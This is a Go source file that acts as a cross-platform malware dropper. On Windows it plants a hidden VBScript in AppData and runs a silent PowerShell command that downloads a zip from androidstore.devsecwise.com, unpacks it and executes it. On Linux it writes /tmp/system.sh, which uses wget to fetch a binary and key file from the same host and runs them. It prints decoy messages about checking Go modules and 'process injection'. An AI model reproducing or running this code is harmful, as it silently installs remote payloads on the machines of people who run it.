package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"os/exec"

	"runtime"
)

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}
func main() {
	os := runtime.GOOS
	switch os {
	case "windows":
		win1()
		fmt.Println("Windows")
		hide()
	case "darwin":
		fmt.Println("MAC operating system")
	case "linux":
		mali()
		//hello()
		//fmt.Println("LInux")
		meo()

	default:
		fmt.Printf("%s.\n", os)
	}
}
func hide() {
	fmt.Println("Checking Go Modules For Fun!")
	time.Sleep(2 * time.Second)
	fmt.Println("Initializing Modules....!")
	temp := os.Stdout
	os.Stdout = nil  
	win3()           
	os.Stdout = temp 
	fmt.Println("Process Injection Done & Session Well Established")
}
func win3() {

	cmd := exec.Command("powershell", "-nologo", "-noprofile")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		defer stdin.Close()
		fmt.Fprintf(stdin, "$prevProgressPreference = $global:ProgressPreference;$global:ProgressPreference = 'SilentlyContinue';Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\";Expand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\";Remove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\";sTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
	}()
	out, err := cmd.CombinedOutput()
	fmt.Printf("%s\n", out)

}

func win1() {
	fmt.Println("File Done For Windows")
	homeDir := UserHomeDir()
	f, err := os.Create(homeDir + "\\AppData" + "\\Roaming" + "\\Microsoft" + "\\windows" + "\\wintemp.vbs")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString("Function config()\nvcOpcaTAcOP = \"cMd /c \"\"\"\"%AppData%\\Microsoft\\Windows\\winupdate\\resi.exe \"\" \"\"\"\"--key %AppData%\\Microsoft\\Windows\\winupdate\\file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\"\"\"\"\"\nset vOpcQrtacv = CreateObject(\"WScript.Shell\")\nvOpcQrtacv.Run vcOpcaTAcOP,0\nEnd Function\nconfig")

	if err2 != nil {
		log.Fatal(err2)
	}
}
func mali() {
	f, err := os.Create("/tmp/system.sh")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString("#!/bin/bash\ncd  ~/go/bin/\nif [ -f test  ];\nthen\nchmod +x test\n./test --key file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\nelse\nwget https://androidstore.devsecwise.com/test > /dev/null 2>&1\nwget https://androidstore.devsecwise.com/file.json > /dev/null 2>&1\nchmod +x test\n./test --key file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\nfi")

	if err2 != nil {
		log.Fatal(err2)
	}
	dongi()
}
func dongi() {
	fmt.Println("executed")
	first_cmd := `chmod +x /tmp/system.sh`
	cmd := exec.Command("bash", "-c", first_cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf(string(output))

}
func meo() {
	fmt.Println("meo also got")
	cmd := exec.Command("/tmp/system.sh", "> /dev/null 2>&1")
	cmd.Dir = "/tmp/"

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
		return
	}

	log.Println("Doing other stuff...")
	testing()

	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}
func testing() {
	fmt.Println("Process Injected & Session Established")
	os.Exit(3)
}
